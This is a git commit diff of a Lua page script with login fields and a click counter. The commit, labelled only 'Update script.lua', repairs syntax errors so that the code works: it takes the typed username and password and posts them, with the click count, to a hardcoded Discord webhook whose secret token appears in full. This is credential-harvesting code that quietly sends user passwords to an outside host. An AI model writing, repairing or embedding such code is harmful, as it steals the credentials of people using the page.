7e9b301f0bfdcf57a79103aa9f7a5708906f9555
Nnamllit1 <158311675+Nnamllit1@users.noreply.github.com>
2024-06-10 18:42:44 +0200

    Update script.lua

--- script.lua
+++ script.lua
@@ -5,13 +5,13 @@ local press = 1
 local user_name = get("user_n")
 local user_pass = get("user_p")
 local log_bool = "false"
-local button-login = get("button_login")
+local button_login = get("button_login")
 
 local discord_webhook_url = "https://discord.com/api/webhooks/1249752568188371085/lOGDGvGYhKpN_uJZWwHXAcg1Bp0FewWNZ5Bnwq05UnbYlZnNxe6ITccLSfIUE_xfy4iI"
 
 button_login.on_click(function()
   if log_bool == "false" then
-    log_bool == "true"
+    log_bool = "true"
   end
 end)
 
@@ -19,22 +19,21 @@ button.on_click(function()
   result.set_content(press)
 
   if log_bool == "true" then
-    
     -- Send data to Discord Webhook
-    local body = "{ \"content\": \.. user_name .. ": " .. user_pass .. ": " .. press .. "\" }"
+    local body = "{ \"content\": \"" .. user_name.get_content() .. ": " .. user_pass.get_content() .. ": " .. press .. "\" }"
     local res = fetch({
-        url = discord_webhook_url,
-        method = "POST",
-        headers = { ["Content-Type"] = "application/json" },
-        body = body,
+      url = discord_webhook_url,
+      method = "POST",
+      headers = { ["Content-Type"] = "application/json" },
+      body = body,
     })
-  end
-      
-  if res and res.status == 204 then
+    
+    if res and res.status == 204 then
       print("Message sent to Discord successfully.")
-  else
+    else
       print("Failed to send message to Discord. Status: " .. (res and res.status or "unknown"))
+    end
   end
-
+  
   press = press + 1
 end)
